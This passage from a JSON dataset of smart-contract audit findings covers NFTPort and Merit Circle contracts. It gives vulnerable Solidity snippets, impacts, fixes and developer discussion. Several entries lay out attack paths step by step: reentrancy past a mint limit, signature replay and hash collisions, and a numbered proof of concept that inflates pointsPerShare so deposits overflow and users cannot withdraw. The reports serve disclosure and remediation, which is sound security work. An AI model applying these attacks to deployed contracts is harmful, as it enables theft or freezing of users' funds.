<= config.maxSupply, \"Tokens per mint must be lte Maximum supply\");\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/7\n\n**rayn731**\n\nFixed, it checks tokens per mint must be less than max supply.",
      "summary": "\nThis bug report was found by ElKu and it concerns the _validateDeploymentConfig function in NFTCollection.sol. The _validateDeploymentConfig function is used to check whether the deploymentConfig input to the initialize function is valid. The function checks whether the maxSupply and tokensPerMint are greater than zero, but it does not check if the tokensPerMint is less than or equal to maxSupply. This could lead to users not being able to mint certain amounts of tokens, even if they are technically trying to mint as per the rules. \n\nThe impact of this bug is dissatisfaction and frustration of the user, as well as the loss of their gas fees. The contract would also need to be redeployed, as the deployment config cannot be changed once it is set. \n\nThe bug was fixed by adding a require statement in the _validateDeploymentConfig function, which checks if the tokensPerMint is less than maxSupply. This was fixed in a pull request by hyperspacebunny and rayn731.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/51",
      "tags": [],
      "finders": [
        "ElKu"
      ]
    },
    {
      "id": "3552",
      "title": "M-7: registerTemplate() can't handle properly when ITemplate version  is 0",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/80 \n\n## Found by \nbin2chen\n\n## Summary\nFactory.sol\nwhen register one template , and template ' s version is 0, the latestImplementation[templateName] will be address(0)\nand add other version, \"_templateNames\" will duplicate\n\n## Vulnerability Detail\nWhen version is equal 0  latestImplementation[templateName]  don't set\n```solidity\n   function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n...\n\n        if (latestImplementation[templateName] == address(0)) { /****add other version, _templateNames will duplicate ****/\n            _templateNames.push(templateName);\n        }\n\n        if (templateVersion > latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; /****templateVersion==0 ,  don't set ****/\n        }\n\n    }\n```\n\n\n## Impact\nlatestImplementation[templateName] and _templateNames will error.\nexternal contracts may think there is no setup, resulting in duplicate setups that keep failing\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L415\n\n## Tool used\n\nManual Review\n\n## Recommendation\n``` solidity\n    function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n\n -      if (templateVersion > latestVersion[templateName]) {\n +      if (templateVersion > = latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; \n        }\n\n\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/4\n\n**rayn731**\n\nFixed, it prevents using version 0, only > 0 is allowed.",
      "summary": "\nThis bug report is about an issue found in the Factory.sol smart contract. The issue is that when a template is registered with a version of 0, the latestImplementation[templateName] will be set to address(0) and _templateNames will be duplicated. This can cause external contracts to think there is no setup, resulting in duplicate setups that keep failing. The code snippet provided is from line 415 of the Factory.sol smart contract. The bug was found by bin2chen through manual review. The recommendation provided is to change the code so that templateVersion > = latestVersion[templateName] instead of just >. This was discussed and then fixed in a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/80",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3551",
      "title": "M-6: Freezing roles in ERC721NFTProduct and ERC1155NFTProduct is moot",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81 \n\n## Found by \n0x52\n\n## Summary\n\nIn ERC721NFTProduct and ERC1155NFTProduct roles can be frozen which is supposed to lock role to current addresses and not allow any changes. The problem is that admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\".\n\n## Vulnerability Detail\n\n    function hasRole(bytes32 role, address account)\n        public\n        view\n        virtual\n        override\n        returns (bool)\n    {\n        return\n            super.hasRole(ADMIN_ROLE, account) || super.hasRole(role, account);\n    }\n\nIn GranularRoles.sol and AccessControlUpgradable.sol, developers are careful to never grant the \"DEFAULT_ADMIN_ROLE\" to any user. Additionally they never set the admin role of any role so that it's admin will remain \"DEFAULT_ADMIN_ROLE\". In theory this should make so that there is no way to grant or revoke roles outside of GranularRoles#_initRoles and updateRoles. The issue is that the override by GranularRoles#hasRole allows \"ADMIN_ROLE\" to bypass any role restriction including \"DEFAULT_ADMIN_ROLE\". This allows \"ADMIN_ROLE\" to directly call AccessControlUpgradable#grantRole and revokeRole, which makes the entire freezing system useless as it doesn't actually stop any role modification.\n\n## Impact\n\nFreezing roles doesn't actually prevent \"ADMIN_ROLE\" from modifying roles as intended. Submitting as high due to gross over-extension of admin authority clearly violating intended guardrails.\n\n## Code Snippet\n\n[GranularRoles.sol#L87-L96](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/lib/GranularRoles.sol#L87-L96)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverride AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called:\n\n     GranularRoles.sol\n\n    +   function grantRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n    +   function revokeRole(bytes32 role, address account) public virtual override {\n    +       revert();\n    +   }\n\n## Discussion\n\n**Evert0x**\n\nAdmin role having more power than intended is not a med/high issue for the protocol team.\n\n**hyperspacebunny**\n\n@Evert0x This actually is valid and pretty high priority for us since it's a workaround for some pretty explicit rules in our permissions system. Can you reopen it?\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/15\n\n**rayn731**\n\nThe fix will disable `DEFAULT_ADMIN_ROLE` to grant/revoke roles, but `_owner` still has the ability to grant/revoke roles even if all roles are frozen?\n\n**hyperspacebunny**\n\nYup, our current intent is that the owner should always have control over the roles if they want to self-manage, freezing is just to remove the delegation to `ADMIN_ROLE`",
      "summary": "\nThis bug report is about an issue in the ERC721NFTProduct and ERC1155NFTProduct smart contracts, which are used to manage Non-Fungible Tokens (NFTs). The issue is that roles can be frozen, which is supposed to lock the role to the current address and prevent any changes. However, the admin can still use AccessControlUpgradable#grantRole and revokeRole to grant and remove roles to addresses because hasRole allows \"ADMIN_ROLE\" to bypass all role restrictions even \"DEFAULT_ADMIN_ROLE\". This means that the freezing system is useless as it doesn't actually stop any role modification. \n\nThe vulnerability was found by 0x52, who used manual review to identify the issue. The code snippet linked to GranularRoles.sol#L87-L96, which contains the override by GranularRoles#hasRole allowing \"ADMIN_ROLE\" to bypass any role restriction. The impact of this issue is that the freezing system doesn't prevent \"ADMIN_ROLE\" from modifying roles as intended, and the severity of the issue was rated as high due to the gross over-extension of admin authority. \n\nA fix was proposed to override AccessControlUpgradable#grantRole and revokeRole in GranularRoles.sol to revert when called. This was then implemented in the pull request https://github.com/nftport/evm-minting-sherlock-fixes/pull/15, which disables \"DEFAULT_ADMIN_ROLE\" to grant/revoke roles. However, the owner still has the ability to grant/revoke roles even if all roles are frozen, as this is the current intent of the system.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/81",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3550",
      "title": "M-5: Template implementations doesn't validate configurations properly",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/83 \n\n## Found by \nElKu, rvierdiiev, obront, pashov, ctf\\_sec, joestakey, ak1, JohnnyTime, GimelSec, Dravee, JohnSmith, cccz\n\n## Summary\n\nIn past audits, we have seen contract admins claim that invalidated configuration setters are fine since “admins are trustworthy”. However, cases such as [Nomad got drained for over $150M](https://twitter.com/samczsun/status/1554260106107179010) and [Misconfiguration in the Acala stablecoin project allows attacker to steal 1.2 billion aUSD](https://web3isgoinggreat.com/single/misconfiguration-in-the-acala-stablecoin-project-allows-attacker-to-steal-1-2-billion-ausd) have shown again and again that even trustable entities can make mistakes. Thus any fields that might potentially result in insolvency of protocol should be thoroughly checked.\n\nNftPort template implementations often ignore checks for config fields. For the rest of the issue, we take `royalty` related fields as an example to illustrate potential consequences of misconfigurations. Notably, lack of check is not limited to `royalty`, but exists among most config fields.\n\nAdmins are allowed to set a wrong `royaltiesBps` which is higher than `ROYALTIES_BASIS`. `royaltyInfo()` will accept this invalid `royaltiesBps` and users will pay a large amount of royalty.\n\n## Vulnerability Detail\n\nEIP-2981 (NFT Royalty Standard) defines `royaltyInfo()` function that specifies how much to pay for a given sale price. In general, royalty should not be higher than 100%. [NFTCollection.sol](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L348) checks that admins can't set royalties to more than 100%:\n```solidity\n    /// Validate a runtime configuration change\n    function _validateRuntimeConfig(RuntimeConfig calldata config)\n        internal\n        view\n    {\n        // Can't set royalties to more than 100%\n        require(config.royaltiesBps <= ROYALTIES_BASIS, \"Royalties too high\");\n\n        ...\n```\n\nBut `NFTCollection` only check `royaltiesBps` when admins call `updateConfig()`, it doesn't check `royaltiesBps` in `initialize()` function, leading to admins could set an invalid `royaltiesBps` (higher than 100%) when initializing contracts.\n\nThe same problem exists in ERC721NFTProduct and ERC1155NFTProduct. Both ERC721NFTProduct and ERC1155NFTProduct don't check `royaltiesBasisPoints` in `initialize()` function. Furthermore, these contracts also don't check `royaltiesBasisPoints` when admins call `update()` function. It means that admins could set an invalid `royaltiesBasisPoints` which may be higher than 100% in any time.\n\n## Impact\n\nEIP-2981 only defines `royaltyInfo()` that it should return royalty amount rather than royalty percentage. It means that if the contract has an invalid royalty percentage which is higher than 100%, `royaltyInfo()` doesn't revert and users will pay a large amount of royalty.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L348\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L153\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC721NFTProduct.sol#L91\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC721NFTProduct.sol#L201\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L96\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L238\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck `royaltiesBps <= ROYALTIES_BASIS` both in `initialize()` and `update()` functions.\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/11\n\n**rayn731**\n\nLGTM, It checks `royaltiesBps` both in `initialize()` and `update()` functions.\nAnd uses `_validatePropertyChange()` to check values both in `initialize()` and `updateConfig()` functions.",
      "summary": "\nThis bug report is about a vulnerability in the NftPort template implementations which allows admins to set an invalid configuration, such as a royalty percentage higher than 100%, when initializing or updating contracts. This could lead to users paying a large amount of royalty, which could potentially result in insolvency of the protocol. \n\nThe bug was found by ElKu, rvierdiiev, obront, pashov, ctf\\_sec, joestakey, ak1, JohnnyTime, GimelSec, Dravee, JohnSmith, and cccz. It was identified through manual review.\n\nThe bug was fixed by hyperspacebunny in a pull request which checks `royaltiesBps` both in `initialize()` and `update()` functions, and uses `_validatePropertyChange()` to check values both in `initialize()` and `updateConfig()` functions. This was confirmed by rayn731. \n\nThe issue serves as a reminder that even trustable entities can make mistakes, and any fields that might potentially result in insolvency of protocol should be thoroughly checked.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/83",
      "tags": [
        "Royalty",
        "ERC2981"
      ],
      "finders": [
        "pashov",
        "cccz",
        "JohnnyTime",
        "joestakey",
        "Dravee",
        "ElKu",
        "JohnSmith",
        "ak1",
        "rvierdiiev",
        "obront",
        "GimelSec",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3549",
      "title": "M-4: Attackers can bypass `tokensPerMint` and mint lots of tokens in a transaction",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/85 \n\n## Found by \n0xSmartContract, GimelSec\n\n## Summary\n\nAttackers can bypass `tokensPerMint`, allowing them to mint over `tokensPerMint` per transaction.\n\n## Vulnerability Detail\n\nNFTCollection has `tokensPerMint` that enforces the maximum number of tokens the user can mint per transaction. But attackers can bypass `tokensPerMint` by reentrancy attack to call `mint()` or `presaleMint()` multiple times in a transaction.\n\nFor example, we assume that `tokensPerMint` is `5` and we have a large amount of `availableSupply()`:\n1. Alice (attacker) first creates an `AttackerContract` to call `mint(5)`, then [L318](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L318) will check that `amount <= _deploymentConfig.tokensPerMint` and call `_safeMint()` on L321.\n2. But `_safeMint()` has a [callback](https://github.com/chiru-labs/ERC721A/blob/v3.2.0/contracts/ERC721A.sol#L392) that it will call `onERC721Received()` if `to` address is a contract.\n3. Now `_safeMint()` calls `onERC721Received()` on the `AttackerContract`, and the `AttackerContract` re-enter `mint(5)` again. `mint()` function will pass the check of `tokensPerMint` on L318 again. Finally, Alice will mint 5+5 tokens in a transaction.\n\n## Impact\n\nAttackers can re-enter `mint()` function again and again to bypass the check of `tokensPerMint`, and mint lots of tokens in a transaction.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317-L322\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIf the protocol wants to check `to` address, keep `_safeMint()` and add [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) on `mint()` and `presaleMint()` to prevent reentrancy attack.\n\nOr just replace `_safeMint()` with `_mint()`.\n\n## Discussion\n\n**hyperspacebunny**\n\nI believe this only applies to free mints since `msg.value` will be 0 when called from the attacker's contract and `mint()` will revert due to the `paymentProvided` modifier.\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/14\n\n**rayn731**\n\nFixed, the fix uses reentrancy guard to prevent the bypass.",
      "summary": "\nThis bug report is about an issue found by 0xSmartContract and GimelSec, which allows attackers to bypass the `tokensPerMint` safety measure in NFTCollection. This safety measure is designed to enforce the maximum number of tokens the user can mint per transaction. \n\nThe vulnerability occurs when an attacker creates a contract that calls `mint()` or `presaleMint()` multiple times in a transaction. This allows the attacker to mint more tokens than the `tokensPerMint` limit.\n\nThe impact of this vulnerability is that attackers can bypass the `tokensPerMint` check and mint more tokens than the limit in a single transaction.\n\nThe code snippet that is vulnerable to this attack is located at https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317-L322. Manual review was used to detect this issue.\n\nThe recommendation to fix this vulnerability is to either add ReentrancyGuard.sol to the `mint()` and `presaleMint()` functions, or to replace `_safeMint()` with `_mint()`. The issue was fixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/14 using ReentrancyGuard.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/85",
      "tags": [],
      "finders": [
        "GimelSec",
        "0xSmartContract"
      ]
    },
    {
      "id": "3548",
      "title": "M-3: The supply of NFT for each tokenID in ERC1155NFTProduct cannot be modified after the first minting",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/95 \n\n## Found by \nGimelSec, cccz\n\n## Summary\nThe supply of NFT for each tokenID in ERC1155NFTProduct cannot be modified after the first minting\n## Vulnerability Detail\nWhen minting NFT in the ERC1155NFTProduct contract, it will check whether the tokenID already exists, that is, as long as tokenSupply[tokenId] > 0, the ERC1155 NFT of this tokenId will not be able to be minted again.\nThis will lead to\n1. The supply of NFT for each tokenID is determined after the first mint\n2. Unable to mint ERC1155 NFT with the same tokenId for different users\n\nThis will greatly limit the application scenarios of ERC1155NFTProduct\n## Impact\n\n1. The supply of NFT for each tokenID is determined after the first mint\n2. Unable to mint ERC1155 NFT with the same tokenId for different users\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L279-L286\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L259-L265\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L388-L390\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider removing the _exists check when minting ERC1155 NFT in the ERC1155NFTProduct contract\n\n## Discussion\n\n**hyperspacebunny**\n\nWe've decided to not change the behaviour at this point and revisit it once we have requests from users. It's currently working as designed.",
      "summary": "\nThis bug report discusses an issue found in the ERC1155NFTProduct contract, which is part of the Sherlock Audit 2022-10-nftport project. The issue is that the supply of NFT for each tokenID in the contract cannot be modified after the first minting. This will greatly limit the application scenarios of ERC1155NFTProduct. The vulnerability was found by GimelSec and cccz through manual review, and the source code snippets were provided. The recommendation is to consider removing the exists check when minting ERC1155 NFT in the ERC1155NFTProduct contract. However, this suggestion was not implemented as it is working as designed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/95",
      "tags": [],
      "finders": [
        "cccz",
        "GimelSec"
      ]
    },
    {
      "id": "3547",
      "title": "M-2: Factory.sol : Issue with arbitrary data as signature in signature based call and deploy methods.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/106 \n\n## Found by \nobront, 8olidity, bin2chen, ak1, minhquanym, ctf\\_sec, JohnSmith, Lambda\n\n## Summary\nIn Factory contract, deploy and call methods are using the signature based approach for deployment. This is not safe when we look at the way the signature is comes from user.\n\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L147-L225\n\nIn above line of codes, user is allowed for deployment by using the signature data. This could have multiple impacts as explained in Impact section.\n\n## Impact\n1. Signature replay attack.\n2. Signature reuse across different NFT Port projects if it is to be launched in multiple chains.\nBecause the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let’s say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user’s (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains.\n3. Signature without domain , nonces are not safe along with the standard specified in EIP 712. \n4. Signature reuse from different Ethereum projects & phishing\nBecause the  signature is very generic, there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his NFT Port project in danger.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L147-L225\n\n## Tool used\n\nManual Review\n\n## Recommendation\nI strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712:\n1.) There is always a domain separator that includes the contract address.\n2.) The chain ID is included in the domain separator\n5.) There is a type hash (of the function name / parameters)\n6.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about a vulnerability found in the Factory contract of the NFT Port project. It is related to the deploy and call methods which use a signature based approach for deployment. This could have multiple impacts such as signature replay attack, signature reuse across different NFT Port projects, signature without domain and nonces, and signature reuse from different Ethereum projects & phishing. It was found by obront, 8olidity, bin2chen, ak1, minhquanym, ctf\\_sec, JohnSmith, and Lambda. The code snippet and manual review were used to identify the issue. The recommended solution was to follow the EIP-712 standard for hashing and signing data. It was fixed in a pull request which follows the EIP-712 standard.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/106",
      "tags": [],
      "finders": [
        "8olidity",
        "minhquanym",
        "bin2chen",
        "Lambda",
        "JohnSmith",
        "ak1",
        "obront",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3546",
      "title": "M-1: `abi.encodePacked` Allows Hash Collision",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118 \n\n## Found by \nkeccak123, 0xheynacho\n\n## Summary\n\nFrom the solidity documentation:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n    > If you use `keccak256(abi.encodePacked(a, b))` and both `a` and `b` are dynamic types, it is easy to craft collisions in the hash value by moving parts of `a` into `b` and vice-versa. More specifically, `abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\")`.\n\nThis issue exists in the Factory contract can results in hash collisions, bypassing the `signedOnly` modifier.\n\n## Vulnerability Detail\n\nThe issue is in these lines of code:\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L171\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L195\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n\nAs the solidity docs describe, two or more dynamic types are passed to `abi.encodePacked`. Moreover, these dynamic values are user-specified function arguments in external functions, meaning anyone can directly specify the value of these arguments when calling the function. The `signedOnly` modifier is supposed to protect functions to permit only function arguments that have been properly signed to be passed to the function logic, but because a collision can be created, the modifier can be bypassed for certain select inputs that result in the same `encodePacked` value.\n\n## Impact\n\nThe `signedOnly` modifier ([line 537](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L537)) is not effective because the modifier can be bypassed by different function arguments that result in the same signature when the values are `encodePacked` together. This can result in the submission of values that were not actually signed.\n\n## Code Snippet\n\nAll instances of `abi.encodePacked` in the contract pass multiple dynamic type arguments\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L171\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L195\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInstead of writing functions to accept several arguments that are hashed inside the function, consider rewriting the function to take the hashed value as a function argument directly so that the hashing process happens off-chain. This approach would solve the issue and save gas.\n\n## Discussion\n\n**Evert0x**\n\nDowngrading to medium severity, fails to show an exploit pattern.\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, and it follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about an issue found in the Factory contract, which allows hash collisions and bypasses the `signedOnly` modifier. This issue is due to the fact that two or more dynamic types are passed to `abi.encodePacked` which can be user-specified function arguments. This can result in the submission of values that were not actually signed.\n\nThe issue was found by keccak123 and 0xheynacho and was fixed in a pull request by hyperspacebunny. The fix follows EIP-712 standard for hashing and signing data.\n\nIn order to solve this issue, the functions should be rewritten to take the hashed value as a function argument directly, so that the hashing process happens off-chain. This would save gas and solve the issue.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118",
      "tags": [
        "Hash Collision",
        "ABI Encoding"
      ],
      "finders": [
        "keccak123",
        "0xheynacho"
      ]
    },
    {
      "id": "3474",
      "title": "M-5: First user can inflate `pointsPerShare` and cause `_correctPoints()` to revert due to overflow",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/103 \n\n## Found by \nWATCHPUG, bin2chen\n\n## Summary\n\n`pointsPerShare` can be manipulated by the first user and cause `_correctPoints()` to revert later.\n\n## Vulnerability Detail\n\n`POINTS_MULTIPLIER` is an unusually large number as a precision fix for `pointsPerShare`: `type(uint128).max ~= 3.4e38`.\n\nThis makes it possible for the first user to manipulate the `pointsPerShare` to near `type(int256).max` and a later regular user can trigger the overflow of `_shares * _shares * ` in `_correctPoints()`.\n\n### PoC\n\n1. `deposit(1 wei)` lock for 10 mins, `mint()` 1 wei of shares;\n2. `distributeRewards(1000e18)`, `pointsPerShare += 1000e18 * type(uint128).max / 1` == 3e59;\n3. the victim `deposit(100e18)` for 1 year, `mint()` 150e18 shares;\n3. `_shares * pointsPerShare == -150e18 * 3e59 == -4.5e+79` which exceeds `type(int256).min`, thus the transaction will revert.\n\nThe attacker can also manipulate `pointsPerShare` to a slightly smaller number, so that `_shares * pointsPerShare` will only overflow after a certain amount of deposits.\n\n## Impact\n\nBy manipulating the `pointPerShare` precisely, the attacker can make it possible for the system to run normally for a little while and only to explode after a certain amount of deposits, as the `pointsPerShare` will be too large by then and all the `_mint` and `_burn` will revert due to overflow in `_correctPoints()`.\n\nThe users who deposited before will be unable to withdraw their funds.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/AbstractRewards.sol#L89-L99\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/BasePool.sol#L80-L88\n\nhttps://github.com/sherlock-audit/2022-10-merit-circle/blob/main/merit-liquidity-mining/contracts/base/AbstractRewards.sol#L125-L127\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n1. Add a minimal mint amount requirement for the first minter and send a portion of the initial shares to gov as a permanent reserve to avoid `pointPerShare` manipulating.\n2. Use a smaller number for `POINTS_MULTIPLIER`, eg, `1e12`.\n\n## Discussion\n\n**federava**\n\nAgree with the recommendation. Requiring a minimal amount for first minter/minting on deployment by governance should be enough to prevent the described manipulation.\n\n**federava**\n\n[PR](https://github.com/Merit-Circle/merit-liquidity-mining/pull/13) from this issue",
      "summary": "\nThis bug report is about an issue in the Merit Circle Liquidity Mining smart contract. It was found by WATCHPUG and bin2chen, and it states that the first user can inflate the `pointsPerShare` variable and cause `_correctPoints()` to revert due to overflow. This is because the `POINTS_MULTIPLIER` is an unusually large number, which allows the first user to manipulate the `pointsPerShare` to near the `type(int256).max`. This can be done by the attacker depositing a small amount of money, locking it for 10 minutes, and minting 1 wei of shares. Then, they can distribute rewards with 1000e18, which will cause the `pointsPerShare` to be 3e59. If a regular user deposits 100e18 for 1 year, and mints 150e18 shares, the `_shares * pointsPerShare` will be -4.5e+79, which exceeds `type(int256).min`, thus the transaction will revert.\n\nThe impact of this vulnerability is that users who deposited before will be unable to withdraw their funds. The code snippets for this issue can be found in the AbstractRewards.sol, BasePool.sol, and AbstractRewards.sol files. The recommended solutions are to add a minimal mint amount requirement for the first minter and send a portion of the initial shares to gov as a permanent reserve to avoid `pointPerShare` manipulating, and to use a smaller number for `POINTS_MULTIPLIER`, such as `1e12`. A PR has also been submitted for this issue.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Merit Circle",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-merit-circle-judging/issues/103",
      "tags": [
        "Share Inflation",
        "Initial Deposit"
      ],
      "finders": [
        "WATCHPUG",
        "bin2chen"
      ]
    },
    {
      "id": "3473",
      "title": "M-4: Front run `distributeRewards()` can steal the newly added rewards",
      "impact": "MEDIUM",
